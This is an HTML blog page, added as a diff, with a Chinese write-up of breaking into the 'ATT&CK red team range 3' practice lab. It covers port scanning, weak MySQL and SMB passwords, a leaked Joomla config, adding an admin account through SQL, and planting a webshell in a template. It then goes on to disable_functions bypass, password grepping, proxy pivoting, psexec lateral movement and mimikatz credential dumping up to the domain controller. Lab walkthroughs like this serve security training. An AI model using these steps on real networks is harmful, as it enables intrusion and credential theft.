@@ -1,0 +1,611 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>ATT&amp;CK红队评估实战靶场-3 | X1NRI</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="下载地址：漏洞详情 (qiyuanxuetang.net)
+
+打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。
+网络搭建VMnet2和VMnet3配置如图所示
+然后启动所有虚拟机，并设置centos一个NAT网卡，同时重启网络服务
+service network restart
+
+黑盒模式，没有账密
+信息搜集先扫端口
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)
+|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)
+80/tcp   open  http    nginx 1.9.4
+|_http-title: Home
+|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
+|_http-generator: Joomla! - Open Source Content Management
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.9.4
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.27-0ubuntu0.16.04.1
+|   Thread ID: 13
+|   Capabilities flags: 63487
+|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, ODBCClient, SupportsCompression, Support41Auth, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: \x11L&gt;y\x0F&amp;#123;&gt;JK\x1AE3i \x1F=U6\x01\x04
+|_  Auth Plugin Name: mysql_native_password"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="ATT&amp;CK红队评估实战靶场-3"/>
+  <meta property="og:site_name" content="X1NRI"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> ATT&amp;CK红队评估实战靶场-3</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">漏洞详情 (qiyuanxuetang.net)</a></p>
+</blockquote>
+<p>打开虚拟机镜像为挂起状态，第一时间进行快照，部分服务未做自启，重启后无法自动运行。</p>
+<h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><p>VMnet2和VMnet3配置如图所示<br><img src="/Rxi134_FILE/986298e29ccae5da90aa4f70ef4a1f12_MD5.jpeg"></p>
+<p>然后启动所有虚拟机，并设置centos一个NAT网卡，同时重启网络服务</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> network restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>黑盒模式，没有账密</p>
+<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p>先扫端口</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 5.3 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 25:84:c6:cc:2c:8a:7b:8f:4a:7c:60:f1:a3:c9:b0:22 (DSA)
+|_  2048 58:d1:4c:59:2d:85:ae:07:69:24:0a:dd:72:0f:45:a5 (RSA)
+80/tcp   open  http    nginx 1.9.4
+|_http-title: Home
+|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
+|_http-generator: Joomla! - Open Source Content Management
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.9.4
+| http-robots.txt: 15 disallowed entries 
+| /joomla/administrator/ /administrator/ /bin/ /cache/ 
+| /cli/ /components/ /includes/ /installation/ /language/ 
+|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
+3306/tcp open  mysql   MySQL 5.7.27-0ubuntu0.16.04.1
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.7.27-0ubuntu0.16.04.1
+|   Thread ID: 13
+|   Capabilities flags: 63487
+|   Some Capabilities: IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, ConnectWithDatabase, Speaks41ProtocolNew, Speaks41ProtocolOld, LongPassword, SupportsTransactions, ODBCClient, SupportsCompression, Support41Auth, InteractiveClient, DontAllowDatabaseTableColumn, IgnoreSigpipes, SupportsLoadDataLocal, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
+|   Status: Autocommit
+|   Salt: \x11L>y\x0F&#123;>JK\x1AE3i \x1F=U6\x01\x04
+|_  Auth Plugin Name: mysql_native_password<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>22端口：ssh<br>80端口：这里扫出来一个 robots.txt，里面是joomla cms的目录<br>3306端口：mysql 5.7.27</p>
+<p>goby上去打些常用poc，直接给我扫出个弱口令，<code>root:123</code><br><img src="/Rxi134_FILE/78677d2143ef5d9c9634c796800f071e_MD5.jpeg"><br>先不急着利用，再搜集些信息</p>
+<p>Joomla CMS<br><img src="/Rxi134_FILE/8f51a446c2a6450bf98a94f5984556d0_MD5.jpeg"></p>
+<p>Joomlascan扫出来一些目录信息，Joomla 3.9.12<br><img src="/Rxi134_FILE/2008ef20127c13f867bb5f0c6854e5d0_MD5.jpeg"></p>
+<p>这里泄露了joomla的配置文件，其中包含了数据库密码和网站绝对路径<br><img src="/Rxi134_FILE/9511a58529b2dc8583373356f598d030_MD5.jpeg"><br><img src="/Rxi134_FILE/7d49600c2c611bd434de1e727f152f2d_MD5.jpeg"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token variable">$dbtype</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'mysqli'</span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'testuser'</span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cvcvgjASD!@'</span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token variable">$db</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'joomla'</span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token variable">$dbprefix</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'am2zu_'</span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token variable">$live_site</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'gXN9Wbpk7ef3A4Ys'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>远程连接数据库，先找找有没有可用的信息，在两个表里存放了账密信息<br><img src="/Rxi134_FILE/b374998d36dab3a65144481d70d63367_MD5.jpeg"></p>
+<p>我们这个用户权限很低，几乎无权进行任何写操作<br><img src="/Rxi134_FILE/6059b9fba6afe41ea3719b42fb46155c_MD5.jpeg"></p>
+<h1 id="尝试数据库写马"><a href="#尝试数据库写马" class="headerlink" title="尝试数据库写马"></a>尝试数据库写马</h1><p>回到root用户，现在有网站的绝对路径，into oufile是没有限制，但是网站目录无权写入<br><img src="/Rxi134_FILE/92032314d1c8e5806e2c200151dd34f5_MD5.jpeg"></p>
+<h1 id="尝试破解哈希"><a href="#尝试破解哈希" class="headerlink" title="尝试破解哈希"></a>尝试破解哈希</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">891	Super User	administrator	test@test.com	$2y$10$t1RelJijihpPhL8LARC9JuM/AWrVR.nto/XycrybdRbk8IEg6Dze2
+
+184	Super User	admin	test@test.com	$2y$10$N/Yv/9rzxyq.z0gLTT5og.pj3FFAP8Sq2PcBgsMX/Qnc2671qQkHy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>becrypt，hashcat没爆出来</p>
+<h1 id="尝试添加新用户"><a href="#尝试添加新用户" class="headerlink" title="尝试添加新用户"></a>尝试添加新用户</h1><p><img src="/Rxi134_FILE/ae2610f8d43a4f32cafab473d5459e67_MD5.jpeg"><br>添加了一个用户，但还是登陆失败</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_users<span class="token variable">`</span></span>
+   <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>name<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>username<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>password<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>params<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>registerDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastvisitDate<span class="token variable">`</span></span>, <span class="token variable"><span class="token variable">`</span>lastResetTime<span class="token variable">`</span></span><span class="token punctuation">)</span>
+VALUES <span class="token punctuation">(</span><span class="token string">'Administrator2'</span>, <span class="token string">'admin2'</span>,
+    <span class="token string">'d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199'</span>, <span class="token string">''</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">)</span>, NOW<span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>
+INSERT INTO <span class="token variable"><span class="token variable">`</span>am2zu_user_usergroup_map<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span>user_id<span class="token variable">`</span></span>,<span class="token variable"><span class="token variable">`</span>group_id<span class="token variable">`</span></span><span class="token punctuation">)</span>
+VALUES <span class="token punctuation">(</span>LAST_INSERT_ID<span class="token punctuation">(</span><span class="token punctuation">)</span>,<span class="token string">'8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>把管理员密码改掉就能登上了<br><img src="/Rxi134_FILE/146fb934f6679b623540b3006b2732fe_MD5.jpeg"><br><img src="/Rxi134_FILE/d4a5ab449597882bd67504629888279e_MD5.jpeg"></p>
+<h1 id="Joomla-后台主题写马"><a href="#Joomla-后台主题写马" class="headerlink" title="Joomla!后台主题写马"></a>Joomla!后台主题写马</h1><p><img src="/Rxi134_FILE/6740098f1b6cc83b4bdd8c52d1b89792_MD5.jpeg"></p>
+<p>任意点击一个主题，修改模板，访问&#x2F;templates&#x2F;beez3&#x2F;error.php即可，上的蚁剑</p>
+<h2 id="disabled-function绕过"><a href="#disabled-function绕过" class="headerlink" title="disabled_function绕过"></a>disabled_function绕过</h2><p>收到 disabled_function 的限制<br><img src="/Rxi134_FILE/9c6a0ef4e19e9a0e0d430910129ee794_MD5.jpeg"></p>
+<p>蚁剑有专门的插件，PHP7_GC_UAF可以成功绕过<br><img src="/Rxi134_FILE/3fc2dc2771fd7290096d71b82198b1ea_MD5.jpeg"></p>
+<h1 id="权限提升到用户"><a href="#权限提升到用户" class="headerlink" title="权限提升到用户"></a>权限提升到用户</h1><p>开了22端口，看看有没有id_rsa<br><img src="/Rxi134_FILE/92f8b5eead72a9227bdd38034f59d422_MD5.jpeg"><br>没有.ssh文件夹，看来不行</p>
+<p>上传linpeas进行一波收集，也没有什么可用的攻击面，倒是内核版本很低，可以提权<br><img src="/Rxi134_FILE/adbec4c2b344b7caa56b72867a62b2b0_MD5.jpeg"></p>
+<p>模糊匹配一些敏感词，比如password、passwd、pass、username</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> <span class="token parameter variable">-r</span> <span class="token parameter variable">-E</span> <span class="token string">'passwd*|password*'</span> /var/www/html /home/yy /tmp  <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/cd51a330c12b4b26c72a9d13cff7ffe2_MD5.jpeg"></p>
+<p>在&#x2F;tmp下找到可疑账密<br><img src="/Rxi134_FILE/8f2484e2010dab9fb80f512537793802_MD5.jpeg"></p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">adduser wwwuser
+passwd wwwuser_123Aqx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>ssh<br><img src="/Rxi134_FILE/734b925dfa65474c2bafd496dd89bc56_MD5.jpeg"></p>
+<p>再上linpeas进行一波收集，还是没什么可用的</p>
+<h1 id="93网段探测"><a href="#93网段探测" class="headerlink" title="93网段探测"></a>93网段探测</h1><p>存在一个 93 网段<br><img src="/Rxi134_FILE/40dfbfc534c50942d6723dda6a74e4ce_MD5.jpeg"></p>
+<p>不好上线CS，这里选择上线msf<br><img src="/Rxi134_FILE/eab5ad07341f9718763f4f9d39ed346d_MD5.jpeg"></p>
+<h2 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h2><p>上传fscan</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">start ping
+(icmp) Target 192.168.93.10   is alive
+(icmp) Target 192.168.93.20   is alive
+(icmp) Target 192.168.93.30   is alive
+(icmp) Target 192.168.93.100  is alive
+(icmp) Target 192.168.93.120  is alive
+[*] Icmp alive hosts len is: 5
+192.168.93.20:80 open
+192.168.93.30:135 open
+192.168.93.10:135 open
+192.168.93.20:135 open
+192.168.93.120:22 open
+192.168.93.100:80 open
+192.168.93.100:22 open
+192.168.93.30:445 open
+192.168.93.30:139 open
+192.168.93.100:3306 open
+192.168.93.20:1433 open
+192.168.93.120:3306 open
+192.168.93.10:139 open
+192.168.93.20:445 open
+192.168.93.20:139 open
+192.168.93.10:445 open
+192.168.93.120:80 open
+192.168.93.10:88 open
+[*] alive ports len is: 18
+start vulscan
+[*] NetInfo 
+[*]192.168.93.30
+   [->]win7
+   [->]192.168.93.30
+[*] NetInfo 
+[*]192.168.93.10
+   [->]WIN-8GA56TNV3MV
+   [->]192.168.93.10
+[*] NetBios 192.168.93.10   [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600
+[*] OsInfo 192.168.93.10	(Windows Server 2012 R2 Datacenter 9600)
+[*] NetBios 192.168.93.20   win2008.test.org                    Windows Server (R) 2008 Datacenter 6003 Service Pack 2
+[*] NetInfo 
+[*]192.168.93.20
+   [->]win2008
+   [->]192.168.93.20
+[*] OsInfo 192.168.93.30	(Windows 7 Professional 7601 Service Pack 1)
+[*] WebTitle http://192.168.93.20      code:404 len:315    title:Not Found
+[*] OsInfo 192.168.93.20	(Windows Server (R) 2008 Datacenter 6003 Service Pack 2)
+[+] mysql 192.168.93.100:3306:root 123
+[+] mysql 192.168.93.120:3306:root 123
+[*] WebTitle http://192.168.93.100     code:200 len:16020  title:Home
+[*] WebTitle http://192.168.93.120     code:200 len:16020  title:Home
+已完成 16/18 [-] ssh 192.168.93.100:22 root 12345678 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 16/18 [-] ssh 192.168.93.100:22 root Aa12345. ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 16/18 [-] ssh 192.168.93.100:22 admin admin1 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 16/18 [-] ssh 192.168.93.120:22 admin a11111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain 
+已完成 18/18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>先整理一下，93段有哪些机子</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">192.168.93.10 Windows Server 2012 R2
+192.168.93.20 win2008
+192.168.93.30 win7
+192.168.93.100 centos 我们所在的位置
+192.168.93.120 linux<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>fscan扫出一个 mysql 弱口令 <code>root:123</code>，是120那台机子</p>
+<h1 id="ew搭建socks5代理"><a href="#ew搭建socks5代理" class="headerlink" title="ew搭建socks5代理"></a>ew搭建socks5代理</h1><p><img src="/Rxi134_FILE/014ea430e8b41de1c5787eb35353ce0d_MD5.jpeg"></p>
+<p>再利用proxfiler实现全局代理<br><img src="/Rxi134_FILE/8570d52d14d969703d275a881a58b406_MD5.jpeg"></p>
+<h1 id="120备份服务器"><a href="#120备份服务器" class="headerlink" title="120备份服务器"></a>120备份服务器</h1><p>navicat连接上数据库<br><img src="/Rxi134_FILE/8c6124efb27613eb95e74468e7f28b90_MD5.jpeg"><br>数据库完全一样，这有可能是个备份服务器<br><img src="/Rxi134_FILE/d80b26776f729e5e972fb3da354c3d06_MD5.jpeg"></p>
+<p>尝试用centos的密码ssh上去，被拒绝，照着原来的写马就行，这里就不再重复了</p>
+<h1 id="域渗透"><a href="#域渗透" class="headerlink" title="域渗透"></a>域渗透</h1><h2 id="尝试永恒之蓝"><a href="#尝试永恒之蓝" class="headerlink" title="尝试永恒之蓝"></a>尝试永恒之蓝</h2><p>这三个windows机器都开了445，给msf加一段session路由，扫这三个windows机器<br><img src="/Rxi134_FILE/99886acb32e07f00ecc70b94fe1ed86f_MD5.jpeg"><br><img src="/Rxi134_FILE/0cafa142dcd00f1f7fd4d90e1f4e8f14_MD5.jpeg"><br>啥都没有</p>
+<h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><ul>
+<li><p>10机器 - Windows Server 2012 R2</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE    VERSION
+25/tcp    open  tcpwrapped
+|_smtp-commands: Couldn't establish connection on port 25
+53/tcp    open  tcpwrapped
+88/tcp    open  tcpwrapped
+110/tcp   open  tcpwrapped
+135/tcp   open  tcpwrapped
+139/tcp   open  tcpwrapped
+389/tcp   open  tcpwrapped
+445/tcp   open  tcpwrapped Windows Server 2012 R2 Datacenter 9600 tcpwrapped
+464/tcp   open  tcpwrapped
+593/tcp   open  tcpwrapped
+636/tcp   open  tcpwrapped
+3268/tcp  open  tcpwrapped
+3269/tcp  open  tcpwrapped
+49155/tcp open  tcpwrapped
+49157/tcp open  tcpwrapped
+49158/tcp open  tcpwrapped
+49159/tcp open  tcpwrapped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</li>
+<li><p>20机器 - win2008</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE      VERSION
+25/tcp    open  tcpwrapped
+|_smtp-commands: Couldn't establish connection on port 25
+80/tcp    open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+110/tcp   open  tcpwrapped
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows Server (R) 2008 Datacenter 6003 Service Pack 2 microsoft-ds (workgroup: TEST)
+1433/tcp  open  ms-sql-s     Microsoft SQL Server 2008 10.00.1600.00; RTM
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Issuer: commonName=SSL_Self_Signed_Fallback
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2019-12-15T05:29:23
+| Not valid after:  2049-12-15T05:29:23
+| MD5:   53e9:ab09:d053:84ac:5740:c08b:c93a:e843
+|_SHA-1: a6a9:c4bd:6d50:a57c:0bec:ad38:5766:7032:0965:33e6
+|_ssl-date: 2024-10-04T11:53:59+00:00; 0s from scanner time.
+| ms-sql-ntlm-info:
+|   192.168.93.20\MSSQLSERVER:
+|     Target_Name: TEST
+|     NetBIOS_Domain_Name: TEST
+|     NetBIOS_Computer_Name: WIN2008
+|     DNS_Domain_Name: test.org
+|     DNS_Computer_Name: win2008.test.org
+|     DNS_Tree_Name: test.org
+|_    Product_Version: 6.0.6003
+| ms-sql-info:
+|   192.168.93.20\MSSQLSERVER:
+|     Instance name: MSSQLSERVER
+|     Version:
+|       name: Microsoft SQL Server 2008 RTM
+|       number: 10.00.1600.00
+|       Product: Microsoft SQL Server 2008
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|     TCP port: 1433
+|_    Clustered: false
+2383/tcp  open  ms-olap4?
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49158/tcp open  msrpc        Microsoft Windows RPC<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+</li>
+<li><p>30机器 - win7</p>
+<pre class="line-numbers language-text" data-language="text"><code class="language-text">PORT      STATE SERVICE
+25/tcp    open  smtp
+110/tcp   open  pop3
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49163/tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
+</ul>
+<p>存在域 test.org</p>
+<p>这里我还试着看看smb有没有匿名登录，不过都不行</p>
+<h2 id="smb弱口令爆破"><a href="#smb弱口令爆破" class="headerlink" title="smb弱口令爆破"></a>smb弱口令爆破</h2><p>看wp说是win7和win2008的SMB是弱口令<code>administrator:123qwe!ASD</code></p>
+<p>我就懒得爆了，直接用</p>
+<h2 id="psexec-拿下win7、win2008"><a href="#psexec-拿下win7、win2008" class="headerlink" title="psexec 拿下win7、win2008"></a>psexec 拿下win7、win2008</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">administrator:123qwe!ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>挂载C盘</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">net use Z: <span class="token punctuation">\</span><span class="token punctuation">\</span><span class="token number">192.168</span>.93.30<span class="token punctuation">\</span>c$ /user:administrator 123qwe<span class="token operator">!</span>ASD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/Rxi134_FILE/923db79b42190219ed5eaeaaa4807ee1_MD5.jpeg"></p>
+<p>利用pstools远程连接到win7<br><img src="/Rxi134_FILE/43021cdda9beb03742dba4fc11c39e22_MD5.jpeg"></p>
+<p>利用pstools远程连接到win2008，但是使用pstools是失败的，不知道为啥，使用msf成功了<br><img src="/Rxi134_FILE/b28d4365efa7d86fe1aa9559802139bf_MD5.jpeg"><br><img src="/Rxi134_FILE/e8747a6b72a98571d26cce60f992ee20_MD5.jpeg"></p>
+<p><img src="/Rxi134_FILE/cd1a543929d7096b0f50fab14f6a4357_MD5.jpeg"></p>
+<h2 id="mimikatz抓取密码"><a href="#mimikatz抓取密码" class="headerlink" title="mimikatz抓取密码"></a>mimikatz抓取密码</h2><p>win7：直接上传mimikatz，没抓到域用户<br><img src="/Rxi134_FILE/e9d18372c2df207195eab95b63d653fc_MD5.jpeg"></p>
+<p>win2008：meterpreter自带kiwi模块，导入后抓取密码，得到域控<code>Administrator:zxcASDqw123!!</code><br><img src="/Rxi134_FILE/ef253f78bf8f604afc9a0a0e1ce7c93c_MD5.jpeg"></p>
+<h2 id="登录域控"><a href="#登录域控" class="headerlink" title="登录域控"></a>登录域控</h2><p><img src="/Rxi134_FILE/e6307a2bba195460de3771908d80f6bf_MD5.jpeg"><br><img src="/Rxi134_FILE/350745b6490ea82aff33c210c8763305_MD5.jpeg"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/10/05/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-3/" class="leancloud-visitors view" data-flag-title="ATT&amp;CK红队评估实战靶场-3">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
